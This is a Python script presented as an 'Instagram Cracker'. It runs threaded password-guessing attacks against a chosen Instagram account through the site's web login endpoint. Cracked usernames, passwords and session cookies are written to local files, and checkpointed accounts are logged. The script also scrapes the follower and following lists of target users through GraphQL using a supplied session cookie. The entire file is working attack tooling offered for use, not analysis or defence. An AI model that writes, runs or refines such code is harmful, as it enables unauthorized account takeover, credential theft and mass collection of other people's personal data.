#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Fixed & Enhanced Version
Fixed critical bugs, optimized performance
Author: BITHIKA
Version: 3.0
"""

import random
import sys
import time
import hashlib
import json
import uuid
import urllib.request
import requests
import string
import os
import re
import threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ANSI Color Codes
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
MAGENTA = "\033[1;95m"
CYAN = "\033[1;96m"
WHITE = "\033[1;97m"
RESET = "\033[0m"

# Global variables
loop = 0
oks = []
cps = []
idz = []
bkas = []
Uuid = []
xx = 0

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"{WHITE}{'='*56}{RESET}")

def menu():
    """Main menu function"""
    clear()
    print(f"""
    {RED}╔══════════════════════════════════════════════════════╗
    ║       {WHITE}INSTAGRAM CRACKER {RED}v3.0 {RESET}           ║
    ║         {WHITE}Made by BITHIKA{RED}                     ║
    ╚══════════════════════════════════════════════════════╝
    
    {WHITE}[{GREEN}1{WHITE}] {GREEN}Bruteforce Attack
    {WHITE}[{GREEN}2{WHITE}] {YELLOW}Dump Followers/Following
    {WHITE}[{GREEN}3{WHITE}] {BLUE}Check Cookies
    {WHITE}[{GREEN}4{WHITE}] {RED}Exit
    """)
    
    try:
        choice = input(f"{WHITE}[{CYAN}+{WHITE}] {YELLOW}Choose option: {RESET}").strip()
        
        if choice == '1':
            bruteforce_menu()
        elif choice == '2':
            dump_menu()
        elif choice == '3':
            check_cookies_menu()
        elif choice == '4':
            print(f"{GREEN}Goodbye!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1)
            menu()
    except KeyboardInterrupt:
        print(f"\n{GREEN}Goodbye!{RESET}")
        sys.exit(0)

def bruteforce_menu():
    """Bruteforce attack menu"""
    clear()
    print(f"""
    {RED}╔══════════════════════════════════════════════════════╗
    ║       {WHITE}BRUTEFORCE ATTACK {RED}v3.0 {RESET}            ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    try:
        # Get username
        uid = input(f"{WHITE}[{CYAN}+{WHITE}] {YELLOW}Instagram Username: {RESET}").strip()
        if not uid:
            print(f"{RED}Username cannot be empty!{RESET}")
            time.sleep(1)
            return menu()
        
        # Get password list
        pwd = input(f"{WHITE}[{CYAN}+{WHITE}] {YELLOW}Password list (comma separated): {RESET}").strip()
        if not pwd:
            print(f"{RED}Password list cannot be empty!{RESET}")
            time.sleep(1)
            return menu()
        
        passwords = [p.strip() for p in pwd.split(',') if p.strip()]
        total_count = len(passwords)
        
        print(f"\n{WHITE}[{GREEN}✓{WHITE}] Target: {CYAN}{uid}{RESET}")
        print(f"{WHITE}[{GREEN}✓{WHITE}] Total passwords: {CYAN}{total_count}{RESET}")
        print(f"{WHITE}[{GREEN}✓{WHITE}] Starting attack...{RESET}\n")
        
        # Start cracking
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(crack, uid, [pw], total_count) for pw in passwords]
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=30)
                except Exception as e:
                    pass
        
        end_time = time.time()
        elapsed = end_time - start_time
        
        print(f"\n{WHITE}Attack completed in {GREEN}{elapsed:.2f}{WHITE} seconds{RESET}")
        print(f"{WHITE}Total attempts: {CYAN}{loop}{RESET}")
        print(f"{WHITE}Successes: {GREEN}{len(oks)}{RESET}")
        print(f"{WHITE}Checkpoints: {YELLOW}{len(cps)}{RESET}\n")
        
        input(f"{WHITE}Press {GREEN}Enter{WHITE} to continue...{RESET}")
        menu()
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Attack interrupted!{RESET}")
        time.sleep(1)
        menu()

def dump_menu():
    """Dump followers/following menu"""
    clear()
    print(f"""
    {RED}╔══════════════════════════════════════════════════════╗
    ║       {WHITE}DUMP FOLLOWERS/FOLLOWING {RED}v3.0 {RESET}      ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    try:
        print(f"{WHITE}[{CYAN}1{WHITE}] {GREEN}Dump Followers")
        print(f"{WHITE}[{CYAN}2{WHITE}] {YELLOW}Dump Following")
        print(f"{WHITE}[{CYAN}3{WHITE}] {RED}Back to Menu")
        
        choice = input(f"\n{WHITE}[{CYAN}+{WHITE}] {YELLOW}Choose option: {RESET}").strip()
        
        if choice == '1':
            setup_dump(True)
        elif choice == '2':
            setup_dump(False)
        elif choice == '3':
            menu()
        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1)
            dump_menu()
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Operation cancelled!{RESET}")
        time.sleep(1)
        menu()

def setup_dump(followers):
    """Setup and execute dump"""
    global Uuid, xx
    
    # Reset global variables
    Uuid = []
    xx = 0
    
    # Get cookies
    coki = get_cookies()
    if not coki:
        print(f"{RED}Failed to get valid cookies!{RESET}")
        time.sleep(2)
        return menu()
    
    # Get target usernames
    print(f"\n{WHITE}[{CYAN}+{WHITE}] {YELLOW}Enter Instagram usernames (comma separated): {RESET}")
    users_input = input(f"{WHITE}[{CYAN}>{WHITE}] {RESET}").strip()
    
    if not users_input:
        print(f"{RED}No usernames entered!{RESET}")
        time.sleep(1)
        return menu()
    
    users = [u.strip() for u in users_input.split(',') if u.strip()]
    
    print(f"\n{YELLOW}Fetching user IDs...{RESET}")
    
    # Get user IDs
    user_ids = []
    for user in users:
        user_id = get_user_id(user, coki)
        if user_id:
            user_ids.append(user_id)
            print(f"{GREEN}✓ Found user ID: {user_id} for {user}{RESET}")
        else:
            print(f"{RED}✗ Could not find user ID for: {user}{RESET}")
        time.sleep(0.5)
    
    if not user_ids:
        print(f"{RED}No valid user IDs found!{RESET}")
        time.sleep(2)
        return menu()
    
    print(f"\n{GREEN}Found {len(user_ids)} valid user IDs{RESET}")
    
    # Start dumping
    mode = "Followers" if followers else "Following"
    print(f"\n{YELLOW}Starting to dump {mode}...{RESET}\n")
    
    for user_id in user_ids:
        print(f"{WHITE}Processing user ID: {CYAN}{user_id}{RESET}")
        dump_graphql(followers, user_id, coki, '')
        time.sleep(1)
    
    # Save results
    if Uuid:
        save_dump_results(Uuid)
        print(f"\n{GREEN}Total users collected: {len(Uuid)}{RESET}")
        
        # Show some results
        print(f"\n{WHITE}Sample of collected users:{RESET}")
        for i, user in enumerate(Uuid[:10]):
            print(f"  {GREEN}{i+1}. {user}{RESET}")
        if len(Uuid) > 10:
            print(f"  {YELLOW}... and {len(Uuid) - 10} more{RESET}")
    else:
        print(f"\n{RED}No users collected!{RESET}")
    
    input(f"\n{WHITE}Press {GREEN}Enter{WHITE} to continue...{RESET}")
    menu()

def get_cookies():
    """Get and validate cookies"""
    cookie_file = 'data/cookie.txt'
    
    # Create data directory if it doesn't exist
    os.makedirs('data', exist_ok=True)
    
    # Try to load existing cookie
    if os.path.exists(cookie_file):
        try:
            with open(cookie_file, 'r') as f:
                cookie_str = f.read().strip()
            if cookie_str:
                print(f"{YELLOW}Found existing cookie, testing...{RESET}")
                coki = {'cookie': cookie_str}
                if test_cookies(coki):
                    print(f"{GREEN}✓ Cookies are valid!{RESET}")
                    return coki
                else:
                    print(f"{RED}✗ Cookies are invalid, please re-enter.{RESET}")
                    os.remove(cookie_file)
        except:
            pass
    
    # Get new cookie
    print(f"{WHITE}[{CYAN}+{WHITE}] {YELLOW}Enter your Instagram cookie{RESET}")
    print(f"{WHITE}Format: sessionid=xxx; ds_user_id=xxx; csrftoken=xxx{RESET}")
    
    cookie_input = input(f"{WHITE}[{CYAN}>{WHITE}] {RESET}").strip()
    
    if not cookie_input:
        print(f"{RED}Cookie cannot be empty!{RESET}")
        time.sleep(1)
        return get_cookies()
    
    # Validate cookie
    coki = {'cookie': cookie_input}
    if not validate_cookie_format(cookie_input):
        print(f"{RED}Invalid cookie format!{RESET}")
        time.sleep(2)
        return get_cookies()
    
    # Test cookie
    if not test_cookies(coki):
        print(f"{RED}✗ Cookie appears invalid. Do you want to continue anyway?{RESET}")
        choice = input(f"{WHITE}[{CYAN}y{WHITE}/{RED}n{WHITE}]: {RESET}").strip().lower()
        if choice != 'y':
            return get_cookies()
    
    # Save cookie
    try:
        os.makedirs('data', exist_ok=True)
        with open(cookie_file, 'w') as f:
            f.write(cookie_input)
        print(f"{GREEN}✓ Cookie saved!{RESET}")
    except:
        pass
    
    return coki

def validate_cookie_format(cookie_str):
    """Validate cookie format"""
    required_fields = ['sessionid', 'ds_user_id']
    
    for field in required_fields:
        if field not in cookie_str:
            print(f"{RED}✗ Cookie missing: {field}{RESET}")
            return False
    
    # Check sessionid format
    session_match = re.search(r'sessionid=([^;]+)', cookie_str)
    if session_match:
        session_value = session_match.group(1)
        if not session_value or len(session_value) < 5:
            print(f"{RED}✗ Session ID appears invalid{RESET}")
            return False
    
    # Check ds_user_id
    user_match = re.search(r'ds_user_id=([^;]+)', cookie_str)
    if user_match:
        user_id = user_match.group(1)
        if not user_id.isdigit():
            print(f"{RED}✗ User ID appears invalid{RESET}")
            return False
    
    return True

def test_cookies(coki):
    """Test if cookies are valid"""
    try:
        # Extract ds_user_id
        uid_match = re.search(r'ds_user_id=(\d+)', str(coki.get('cookie', '')))
        if not uid_match:
            return False
        
        uid = uid_match.group(1)
        
        # Test API call
        response = requests.get(
            f'https://i.instagram.com/api/v1/users/{uid}/info/',
            headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15'},
            cookies=coki,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if 'user' in data:
                return True
        
        return False
        
    except:
        return False

def get_user_id(username, cookies):
    """Get user ID from username"""
    try:
        # Method 1: API
        url = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15',
            'x-ig-app-id': '1217981644879628'
        }
        
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'user' in data['data']:
                user_id = data['data']['user'].get('id')
                if user_id:
                    return user_id
        
        # Method 2: GraphQL
        url = 'https://www.instagram.com/graphql/query/'
        params = {
            'query_hash': 'c9100bf9110dd6361671f113dd02e7d6',
            'variables': json.dumps({'username': username})
        }
        
        response = requests.get(url, params=params, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'user' in data['data']:
                user_id = data['data']['user'].get('id')
                if user_id:
                    return user_id
        
        return None
        
    except:
        return None

def dump_graphql(followers, user_id, cookies, after):
    """Dump followers or following using GraphQL"""
    global Uuid, xx
    
    api = "https://www.instagram.com/graphql/query/"
    
    # Query hashes
    if followers:
        query_hash = "37479f2b8209594dde7facb0d904896a"  # Followers
    else:
        query_hash = "58712303d941c6855d4e888c5f0cd22f"  # Following
    
    variables = {
        "id": user_id,
        "first": 50,
        "after": after
    }
    
    params = {
        'query_hash': query_hash,
        'variables': json.dumps(variables)
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "application/json",
        "Cookie": cookies.get('cookie', ''),
        "x-ig-app-id": "1217981644879628"
    }
    
    try:
        response = requests.get(api, params=params, headers=headers, timeout=30)
        response.raise_for_status()
        data = response.json()
        
        # Check for errors
        if 'require_login' in data:
            print(f"{RED}Need to login!{RESET}")
            return
        
        if 'status' in data and data['status'] == 'fail':
            print(f"{RED}Request failed: {data.get('message', 'Unknown error')}{RESET}")
            return
        
        # Determine the correct key
        key = 'edge_followed_by' if followers else 'edge_follow'
        
        # Check if user exists
        if 'data' not in data or 'user' not in data['data'] or not data['data']['user']:
            print(f"{RED}User not found or private{RESET}")
            return
        
        user_data = data['data']['user']
        
        if key not in user_data:
            print(f"{YELLOW}No visible data for this user{RESET}")
            return
        
        # Process edges
        edges = user_data[key].get('edges', [])
        
        if not edges:
            print(f"{YELLOW}No results found{RESET}")
            return
        
        for edge in edges:
            username = edge['node'].get('username', '')
            full_name = edge['node'].get('full_name', '')
            
            if username:
                entry = f"{username}|{full_name}"
                if entry not in Uuid:
                    xx += 1
                    Uuid.append(entry)
                    print(f'\r{WHITE}Collected: {GREEN}{len(Uuid)}{WHITE} users    {RESET}', end='', flush=True)
        
        # Check for next page
        page_info = user_data[key].get('page_info', {})
        if page_info.get('has_next_page', False):
            after = page_info.get('end_cursor', '')
            if after:
                time.sleep(0.5)
                dump_graphql(followers, user_id, cookies, after)
                
    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")

def save_dump_results(results):
    """Save dump results to file"""
    try:
        os.makedirs('data', exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'data/dump_{timestamp}.txt'
        
        with open(filename, 'w', encoding='utf-8') as f:
            for entry in results:
                f.write(f"{entry}\n")
        
        print(f"\n{GREEN}✓ Results saved to: {filename}{RESET}")
        
    except Exception as e:
        print(f"{RED}Error saving results: {e}{RESET}")

def check_cookies_menu():
    """Check cookies menu"""
    clear()
    print(f"""
    {RED}╔══════════════════════════════════════════════════════╗
    ║       {WHITE}CHECK COOKIES {RED}v3.0 {RESET}                 ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    coki = get_cookies()
    
    if coki and test_cookies(coki):
        print(f"\n{GREEN}✓ Cookies are valid!{RESET}")
        
        # Get user info
        try:
            uid_match = re.search(r'ds_user_id=(\d+)', str(coki.get('cookie', '')))
            if uid_match:
                uid = uid_match.group(1)
                response = requests.get(
                    f'https://i.instagram.com/api/v1/users/{uid}/info/',
                    headers={'User-Agent': 'Mozilla/5.0'},
                    cookies=coki,
                    timeout=10
                )
                if response.status_code == 200:
                    data = response.json()
                    user = data.get('user', {})
                    print(f"{WHITE}Username: {CYAN}{user.get('username', 'N/A')}{RESET}")
                    print(f"{WHITE}Full Name: {CYAN}{user.get('full_name', 'N/A')}{RESET}")
                    print(f"{WHITE}Followers: {CYAN}{user.get('follower_count', 0)}{RESET}")
                    print(f"{WHITE}Following: {CYAN}{user.get('following_count', 0)}{RESET}")
        except:
            pass
    else:
        print(f"\n{RED}✗ Cookies are invalid!{RESET}")
    
    input(f"\n{WHITE}Press {GREEN}Enter{WHITE} to continue...{RESET}")
    menu()

def crack(username, passwords, total_count):
    """Enhanced cracking function"""
    global loop, oks, cps, bkas
    
    with counter_lock:
        loop += 1
    
    colors = [
        "\033[1;90m", "\033[1;91m", "\033[1;92m",
        "\x1b[38;5;208m", "\033[1;93m", "\033[1;94m",
        "\033[1;95m", "\033[1;96m"
    ]
    
    try:
        for password in passwords:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} {GREEN}{success_count}{WHITE}/{RED}{fail_count} {WHITE}[{YELLOW}{percentage:.1f}%{WHITE}]                   {RESET}")
            sys.stdout.flush()
            
            # Create session
            session = requests.Session()
            
            # Get CSRF token
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            
            if not csrftoken:
                continue
            
            # Prepare data
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
            
            cookies = {
                'csrftoken': csrftoken,
                'ig_did': str(uuid.uuid4()).upper(),
            }
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-csrftoken': csrftoken,
                'x-ig-app-id': '936619743392459',
            }
            
            data = {
                'enc_password': enc_password,
                'username': username,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
            }
            
            # Make login request
            response = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                result = response.json()
                
                if result.get('authenticated'):
                    # Success!
                    sessionid = session.cookies.get('sessionid')
                    ds_user_id = session.cookies.get('ds_user_id')
                    
                    if sessionid and ds_user_id:
                        cookie_str = f"sessionid={sessionid}; ds_user_id={ds_user_id}; csrftoken={csrftoken}"
                        
                        with success_lock:
                            oks.append(username)
                            bkas.append(username)
                        
                        print(f"\r{GREEN}[✓ SUCCESS] {username} | {password}{RESET}")
                        print(f"{WHITE}Cookies: {cookie_str}{RESET}")
                        
                        # Save successful login
                        save_success(username, password, cookie_str)
                        return True
                
                elif 'checkpoint_url' in result:
                    print(f"\r{YELLOW}[⚠ CHECKPOINT] {username} | {password}{RESET}")
                    with success_lock:
                        cps.append(username)
                    save_checkpoint(username, password)
                    continue
                
                elif 'error' in result:
                    continue
            
            time.sleep(random.uniform(0.5, 1.5))
            
    except Exception as e:
        # Silently handle errors
        pass
    
    return False

def save_success(username, password, cookies):
    """Save successful login"""
    try:
        # Create directory
        os.makedirs('/sdcard/XYZ', exist_ok=True)
        
        # Save to file
        with open('/sdcard/XYZ/RANDOM_OK.txt', 'a', encoding='utf-8') as f:
            f.write(f"{username}|{password}|{cookies}\n")
            
    except:
        try:
            os.makedirs('XYZ', exist_ok=True)
            with open('XYZ/RANDOM_OK.txt', 'a', encoding='utf-8') as f:
                f.write(f"{username}|{password}|{cookies}\n")
        except:
            pass

def save_checkpoint(username, password):
    """Save checkpoint requiring"""
    try:
        with open('/sdcard/SUMON_INS_CP.txt', 'a', encoding='utf-8') as f:
            f.write(f"{username}|{password}\n")
    except:
        pass

# Main execution
if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests']
        missing = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing.append(module)
        
        if missing:
            print(f"{RED}Missing modules: {', '.join(missing)}{RESET}")
            print(f"{YELLOW}Install with: pip install {' '.join(missing)}{RESET}")
            sys.exit(1)
        
        # Start program
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n{GREEN}Program terminated by user{RESET}")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n{RED}Fatal error: {e}{RESET}")
        sys.exit(1)
